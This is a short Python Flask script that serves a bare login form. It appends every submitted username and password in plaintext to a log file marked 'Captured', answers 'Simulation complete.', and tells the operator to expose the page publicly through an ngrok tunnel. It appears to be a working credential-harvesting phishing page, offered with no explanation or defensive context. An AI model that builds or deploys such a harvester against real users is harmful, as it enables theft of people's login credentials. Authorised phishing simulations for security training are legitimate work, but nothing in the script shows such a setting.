from flask import Flask, request

app = Flask(__name__)

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        with open("../logs/attempts.log", "a") as log_file:
            log_file.write(f"Captured - Username: {username}, Password: {password}\n")
        return "Simulation complete."
    return '''
    <form method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Submit">
    </form>
    '''

if __name__ == "__main__":
    print("Run 'ngrok http 8080' to create a public HTTPS tunnel.")
    app.run(port=8080)
